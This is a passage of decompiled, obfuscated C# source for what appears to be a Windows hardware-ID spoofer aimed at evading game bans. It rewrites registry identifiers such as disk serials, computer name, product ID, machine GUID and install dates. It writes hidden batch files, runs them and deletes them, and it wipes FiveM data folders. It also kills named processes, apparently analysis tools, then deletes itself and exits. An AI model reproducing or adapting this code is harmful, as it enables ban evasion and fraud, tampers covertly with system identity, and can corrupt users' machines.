			Registry.SetValue(global::i.a("", 60654), global::i.a("", 58264), 0);
			Registry.SetValue(global::i.a("", 62426), global::i.a("", 62249), 1);
			Registry.SetValue(global::i.a("", 61945), global::i.a("", 59561), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59093), global::i.a("", 57420), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60094), global::i.a("", 61890), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59093), global::i.a("", 57462), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59093), global::i.a("", 57745), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59716), global::i.a("", 61870), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59716), global::i.a("", 61842), global::i.a("", 59686), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60688), global::i.a("", 58832), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60688), global::i.a("", 63271), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 57648), false);
			Registry.SetValue(global::i.a("", 60132), global::i.a("", 61911), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60132), global::i.a("", 63701), global::i.a("", 61856), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60132), global::i.a("", 60932), global::i.a("", 61856), RegistryValueKind.DWord);
			Main.HWIDclick();
			string text = Path.ChangeExtension(Path.GetTempFileName(), global::i.a("", 61228));
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine(global::i.a("", 63169));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63605));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63190));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 61885));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 60636));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58627));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58177));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59395));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58627));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63284));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59693));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 61460));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59694));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59693));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59881));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63686));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63284));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 57921));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63284));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58170));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58976));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58127));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59648));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 63038));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 57867));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58148));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 62555));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 62501));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 60348));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 62581));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 57689));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 61062));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59076));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59939));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 62841));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59271));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 60496));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59294));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 57852));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 60547));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 57946));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59162));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58468));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58170));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58460));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58176));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 62660));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 62819));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 61421));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 58035));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 59959));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 60166));
				streamWriter.WriteLine(global::i.a("", 63311));
				streamWriter.WriteLine(global::i.a("", 60517));
				streamWriter.WriteLine(global::i.a("", 63311));
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show(global::i.a("", 62820), global::i.a("", 58067), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00009C78 File Offset: 0x00007E78
		public static string RandomId(int length)
		{
			string text = global::i.a("", 61040);
			string text2 = "";
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				text2 += text[random.Next(text.Length)].ToString();
			}
			return text2;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00009CD8 File Offset: 0x00007ED8
		public static void Disk()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey(global::i.a("", 57377)).GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey(global::i.a("", 60832) + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						global::i.a("", 60832),
						text,
						global::i.a("", 63626),
						text2,
						global::i.a("", 60331)
					}), true);
					if (registryKey != null && registryKey.GetValue(global::i.a("", 62479)).ToString() == global::i.a("", 57840))
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue(global::i.a("", 62346), Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue(global::i.a("", 57785), value);
						registryKey.SetValue(global::i.a("", 61386), Encoding.UTF8.GetBytes(value));
						registryKey.SetValue(global::i.a("", 59545), value2);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey(global::i.a("", 61572)).GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey(global::i.a("", 61093) + str, true).SetValue(global::i.a("", 57785), Main.RandomId(8) + global::i.a("", 62273) + Main.RandomId(8) + global::i.a("", 62015));
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00002200 File Offset: 0x00000400
		private void ak(object sender, EventArgs e)
		{
			Main.Disk();
			MessageBox.Show(global::i.a("", 58766), global::i.a("", 58318), MessageBoxButtons.OK);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00009F18 File Offset: 0x00008118
		public static string GenerateString(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = global::i.a("", 61954)[Main.random.Next(global::i.a("", 61954).Length)];
			}
			return new string(array);
		}

		// Token: 0x06000069 RID: 105 RVA: 0x0000222C File Offset: 0x0000042C
		private void al(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show(global::i.a("", 60325), global::i.a("", 63104), MessageBoxButtons.OK);
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00009F78 File Offset: 0x00008178
		public static void SpoofPCName()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 59716), true);
			registryKey.SetValue(global::i.a("", 61846), global::i.a("", 60195) + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00009FE0 File Offset: 0x000081E0
		private void am(object sender, EventArgs e)
		{
			Main.SpoofPCName();
			DialogResult dialogResult = MessageBox.Show(global::i.a("", 62452), global::i.a("", 63575), MessageBoxButtons.YesNo);
			if (dialogResult == DialogResult.Yes)
			{
				Process.Start(new ProcessStartInfo(global::i.a("", 61444), global::i.a("", 59512))
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x0000A05C File Offset: 0x0000825C
		private static void an()
		{
			try
			{
				Process process = new Process();
				process.StartInfo.Arguments = global::i.a("", 61539);
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
				MessageBox.Show(global::i.a("", 61723));
			}
			catch
			{
				MessageBox.Show(global::i.a("", 61966), global::i.a("", 61003), MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x0000A10C File Offset: 0x0000830C
		private void ao(object sender, EventArgs e)
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				global::i.a("", 59537),
				Main.GenerateString(5),
				global::i.a("", 59537),
				Main.GenerateString(5),
				global::i.a("", 59537),
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 62674), true);
			registryKey.SetValue(global::i.a("", 60822), value);
			registryKey.Close();
			MessageBox.Show(global::i.a("", 61130) + Main.CurrentProductID(), global::i.a("", 63410), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600006E RID: 110 RVA: 0x0000A1F4 File Offset: 0x000083F4
		public static string CurrentProductID()
		{
			string text = global::i.a("", 62514);
			string text2 = global::i.a("", 61446);
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
				{
					if (registryKey2 == null)
					{
						throw new KeyNotFoundException(string.Format(global::i.a("", 60494), text));
					}
					object value = registryKey2.GetValue(text2);
					if (value == null)
					{
						throw new IndexOutOfRangeException(string.Format(global::i.a("", 62129), text2));
					}
					result = value.ToString();
				}
			}
			return result;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x000021A9 File Offset: 0x000003A9
		private void ap(object sender, EventArgs e)
		{
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000021A9 File Offset: 0x000003A9
		private void aq(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000071 RID: 113 RVA: 0x0000225D File Offset: 0x0000045D
		private void ar(object sender, EventArgs e)
		{
			Process.Start(global::i.a("", 58677));
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000021A9 File Offset: 0x000003A9
		private void @as(object sender, EventArgs e)
		{
		}

		// Token: 0x06000073 RID: 115 RVA: 0x0000A2CC File Offset: 0x000084CC
		public static void InstallDate()
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 58117), true);
			registryKey.SetValue(global::i.a("", 61799), value);
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00002274 File Offset: 0x00000474
		private void at(object sender, EventArgs e)
		{
			Main.InstallDate();
			MessageBox.Show(global::i.a("", 62493), global::i.a("", 61354), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000075 RID: 117 RVA: 0x0000A31C File Offset: 0x0000851C
		private static void au()
		{
			Process[] processesByName = Process.GetProcessesByName(global::i.a("", 60416));
			if (processesByName.Length != 0)
			{
				Process.Start(new ProcessStartInfo(global::i.a("", 63030), global::i.a("", 60440))
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start(global::i.a("", 62035), global::i.a("", 59944) + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName2 = Process.GetProcessesByName(global::i.a("", 59582));
			if (processesByName2.Length != 0)
			{
				Process.Start(new ProcessStartInfo(global::i.a("", 63030), global::i.a("", 60440))
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start(global::i.a("", 62035), global::i.a("", 59944) + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName3 = Process.GetProcessesByName(global::i.a("", 63266));
			if (processesByName3.Length != 0)
			{
				Process.Start(new ProcessStartInfo(global::i.a("", 63030), global::i.a("", 60440))
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start(global::i.a("", 62035), global::i.a("", 59944) + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName4 = Process.GetProcessesByName(global::i.a("", 60137));
			if (processesByName4.Length != 0)
			{
				Process.Start(new ProcessStartInfo(global::i.a("", 63030), global::i.a("", 60440))
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start(global::i.a("", 62035), global::i.a("", 59944) + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName5 = Process.GetProcessesByName(global::i.a("", 57746));
			if (processesByName5.Length != 0)
			{
				Process.Start(new ProcessStartInfo(global::i.a("", 63030), global::i.a("", 60440))
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start(global::i.a("", 62035), global::i.a("", 59944) + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName6 = Process.GetProcessesByName(global::i.a("", 58716));
			if (processesByName6.Length != 0)
			{
				Process.Start(new ProcessStartInfo(global::i.a("", 63030), global::i.a("", 60440))
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start(global::i.a("", 62035), global::i.a("", 59944) + Application.ExecutablePath);
				Application.Exit();
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x0000A67C File Offset: 0x0000887C
		private void av(object sender, EventArgs e)
		{
			if (File.Exists(global::i.a("", 61719)))
			{
				File.Delete(global::i.a("", 61719));
			}
			if (File.Exists(global::i.a("", 58412)))
			{
				File.Delete(global::i.a("", 58412));
			}
			string text = this.bh.Text;
			string path = global::i.a("", 58089);
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists(global::i.a("", 61719)))
			{
				string text2 = global::i.a("", 58412);
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						global::i.a("", 63144),
						text,
						global::i.a("", 62236),
						Main.DiskGen(4),
						global::i.a("", 59614),
						Main.DiskGen(4),
						global::i.a("", 63713)
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.d.Add(process);
				File.SetAttributes(global::i.a("", 58412), FileAttributes.Hidden);
				process.Start();
				MessageBox.Show(global::i.a("", 60216), global::i.a("", 62579), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete(global::i.a("", 61719));
				File.Delete(global::i.a("", 58412));
				Directory.Delete(path);
			}
			else
			{
				Thread.Sleep(500);
				string text3 = global::i.a("", 58412);
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						global::i.a("", 63144),
						text,
						global::i.a("", 62236),
						Main.DiskGen(4),
						global::i.a("", 59614),
						Main.DiskGen(4),
						global::i.a("", 63713)
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes(global::i.a("", 58412), FileAttributes.Hidden);
				process2.Start();
				MessageBox.Show(global::i.a("", 60216), global::i.a("", 62579), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete(global::i.a("", 61719));
				File.Delete(global::i.a("", 58412));
				Directory.Delete(path);
			}
		}

		// Token: 0x06000077 RID: 119 RVA: 0x000021A9 File Offset: 0x000003A9
		private void aw(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000078 RID: 120 RVA: 0x0000A9A8 File Offset: 0x00008BA8
		private void ax(object sender, EventArgs e)
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 59399), true);
			registryKey.SetValue(global::i.a("", 63024), value);
			registryKey.Close();
			MessageBox.Show(global::i.a("", 63563), global::i.a("", 58723), MessageBoxButtons.OK);
		}

		// Token: 0x06000079 RID: 121 RVA: 0x0000AA24 File Offset: 0x00008C24
		private void ay(object sender, EventArgs e)
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey(global::i.a("", 62711)).GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey(global::i.a("", 60413) + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						global::i.a("", 60413),
						text,
						global::i.a("", 61272),
						text2,
						global::i.a("", 61998)
					}), true);
					if (registryKey != null && registryKey.GetValue(global::i.a("", 63678)).ToString() == global::i.a("", 59709))
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue(global::i.a("", 61571), Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue(global::i.a("", 60364), value);
						registryKey.SetValue(global::i.a("", 59049), Encoding.UTF8.GetBytes(value));
						registryKey.SetValue(global::i.a("", 63498), value2);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey(global::i.a("", 62457)).GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey(global::i.a("", 59330) + str, true).SetValue(global::i.a("", 60364), Main.RandomId(8) + global::i.a("", 61571) + Main.RandomId(8) + global::i.a("", 62037));
			}
			MessageBox.Show(global::i.a("", 58865), global::i.a("", 59181), MessageBoxButtons.OK);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x000022A2 File Offset: 0x000004A2
		private void az(object sender, EventArgs e)
		{
			Main.NetWoof();
			Thread.Sleep(2500);
			MessageBox.Show(global::i.a("", 63516), global::i.a("", 60691), MessageBoxButtons.OK);
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000AC88 File Offset: 0x00008E88
		private void ba(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			Main.NetWoof();
			if (File.Exists(global::i.a("", 60579)))
			{
				File.Delete(global::i.a("", 60579));
			}
			if (File.Exists(global::i.a("", 60001)))
			{
				File.Delete(global::i.a("", 60001));
			}
			string text = this.bh.Text;
			string path = global::i.a("", 59201);
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists(global::i.a("", 60579)))
			{
				string text2 = global::i.a("", 60001);
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						global::i.a("", 58962),
						text,
						global::i.a("", 62533),
						Main.DiskGen(4),
						global::i.a("", 61904),
						Main.DiskGen(4),
						global::i.a("", 59715)
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.d.Add(process);
				File.SetAttributes(global::i.a("", 60001), FileAttributes.Hidden);
				process.Start();
				MessageBox.Show(global::i.a("", 61465), global::i.a("", 60567), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete(global::i.a("", 60579));
				File.Delete(global::i.a("", 60001));
				Directory.Delete(path);
			}
			else
			{
				Thread.Sleep(500);
				string text3 = global::i.a("", 60001);
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						global::i.a("", 58962),
						text,
						global::i.a("", 62533),
						Main.DiskGen(4),
						global::i.a("", 61904),
						Main.DiskGen(4),
						global::i.a("", 59715)
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes(global::i.a("", 60001), FileAttributes.Hidden);
				process2.Start();
				File.Delete(global::i.a("", 60579));
				File.Delete(global::i.a("", 60001));
				Directory.Delete(path);
			}
			Main.HWIDclick();
			string path2 = global::i.a("", 59605);
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists(global::i.a("", 58071)))
			{
				Process.Start(global::i.a("", 58071));
			}
			else
			{
				string text4 = global::i.a("", 58071);
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine(global::i.a("", 63509));
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.d.Add(process3);
				File.SetAttributes(global::i.a("", 58071), FileAttributes.Hidden);
				process3.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
			Thread.Sleep(2000);
			MessageBox.Show(global::i.a("", 62930), global::i.a("", 60567), MessageBoxButtons.OK);
		}

		// Token: 0x0600007C RID: 124 RVA: 0x000022D8 File Offset: 0x000004D8
		private void bb(object sender, EventArgs e)
		{
			this.ay.BringToFront();
		}

		// Token: 0x0600007D RID: 125 RVA: 0x0000B0C8 File Offset: 0x000092C8
		private void bc(object sender, EventArgs e)
		{
			if (File.Exists(global::i.a("", 60422)))
			{
				File.Delete(global::i.a("", 60422));
			}
			if (File.Exists(global::i.a("", 60634)))
			{
				File.Delete(global::i.a("", 60634));
			}
			MessageBox.Show(global::i.a("", 63238), global::i.a("", 59528), MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0600007E RID: 126 RVA: 0x000022D8 File Offset: 0x000004D8
		private void bd(object sender, EventArgs e)
		{
			this.ay.BringToFront();
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000021A9 File Offset: 0x000003A9
		private void be(object sender, EventArgs e)
		{
		}

		// Token: 0x06000080 RID: 128 RVA: 0x0000B150 File Offset: 0x00009350
		private void bf(object sender, EventArgs e)
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 63294), true);
			registryKey.SetValue(global::i.a("", 62161), value);
			registryKey.Close();
			MessageBox.Show(global::i.a("", 58332), global::i.a("", 59908), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000021A9 File Offset: 0x000003A9
		private void bg(object sender, EventArgs e)
		{
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000021A9 File Offset: 0x000003A9
		private void bh(object sender, EventArgs e)
		{
		}

		// Token: 0x06000083 RID: 131 RVA: 0x0000B1CC File Offset: 0x000093CC
		public static void NetWoof()
		{
			List<Process> list = new List<Process>();
			string path = global::i.a("", 58221);
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists(global::i.a("", 58508)))
			{
				Process.Start(global::i.a("", 58508));
				File.Delete(global::i.a("", 58508));
			}
			else
			{
				string text = global::i.a("", 58508);
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine(global::i.a("", 61655));
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes(global::i.a("", 58508), FileAttributes.Hidden);
				process.Start();
				Thread.Sleep(500);
				File.Delete(global::i.a("", 58508));
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x0000B2EC File Offset: 0x000094EC
		public static void HWIDclick()
		{
			string keyName = global::i.a("", 61791);
			string text = (string)Registry.GetValue(keyName, global::i.a("", 63320), global::i.a("", 60409));
			string value = string.Concat(new string[]
			{
				global::i.a("", 60458),
				Main.GenID(5),
				global::i.a("", 60198),
				Main.GenID(5),
				global::i.a("", 60198),
				Main.GenID(4),
				global::i.a("", 60198),
				Main.GenID(9),
				global::i.a("", 60741)
			});
			Registry.SetValue(keyName, global::i.a("", 60269), value);
			Registry.SetValue(keyName, global::i.a("", 63320), value);
		}

		// Token: 0x06000085 RID: 133 RVA: 0x0000B3EC File Offset: 0x000095EC
		public static void XBOXclick()
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 60358), true);
			registryKey.SetValue(global::i.a("", 60964), value);
		}

		// Token: 0x06000086 RID: 134 RVA: 0x0000B43C File Offset: 0x0000963C
		public static void IDclick()
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				global::i.a("", 61486),
				Main.GenerateString(5),
				global::i.a("", 61486),
				Main.GenerateString(5),
				global::i.a("", 61486),
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 63208), true);
			registryKey.SetValue(global::i.a("", 59434), value);
			registryKey.Close();
		}

		// Token: 0x06000087 RID: 135 RVA: 0x0000B4F0 File Offset: 0x000096F0
		public static void PCclick()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 60158), true);
			registryKey.SetValue(global::i.a("", 60895), global::i.a("", 58879) + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x06000088 RID: 136 RVA: 0x0000B558 File Offset: 0x00009758
		public static void Diskclick()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey(global::i.a("", 57887)).GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey(global::i.a("", 59285) + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						global::i.a("", 59285),
						text,
						global::i.a("", 57854),
						text2,
						global::i.a("", 60301)
					}), true);
					if (registryKey != null && registryKey.GetValue(global::i.a("", 59030)).ToString() == global::i.a("", 62338))
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue(global::i.a("", 63075), Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue(global::i.a("", 62772), value);
						registryKey.SetValue(global::i.a("", 62087), Encoding.UTF8.GetBytes(value));
						registryKey.SetValue(global::i.a("", 62891), value2);
					}
				}
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x0000B6F8 File Offset: 0x000098F8
		public static void FiveM()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (Directory.Exists(folderPath + global::i.a("", 58388)))
			{
				Directory.Delete(folderPath + global::i.a("", 58388), true);
			}
			if (Directory.Exists(folderPath + global::i.a("", 61784)))
			{
				Directory.Delete(folderPath + global::i.a("", 61784), true);
			}
			if (Directory.Exists(folderPath + global::i.a("", 63612)))
			{
				Directory.Delete(folderPath + global::i.a("", 63612), true);
			}
			if (Directory.Exists(folderPath + global::i.a("", 58422)))
			{
				Directory.Delete(folderPath + global::i.a("", 58422), true);
			}
			Directory.Exists(folderPath + global::i.a("", 59684));
			if (Directory.Exists(folderPath2 + global::i.a("", 59830)))
			{
				Directory.Delete(folderPath2 + global::i.a("", 59830), true);
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x0000B844 File Offset: 0x00009A44
		private static void bi()
		{
			Main.bj(global::i.a("", 59828));
			Thread.Sleep(600);
			Main.bj(global::i.a("", 58830));
			Main.bj(global::i.a("", 62976));
			Main.bj(global::i.a("", 62439));
			File.Delete(global::i.a("", 62216));
		}

		// Token: 0x0600008B RID: 139 RVA: 0x0000B8C0 File Offset: 0x00009AC0
		private static void bj(string a)
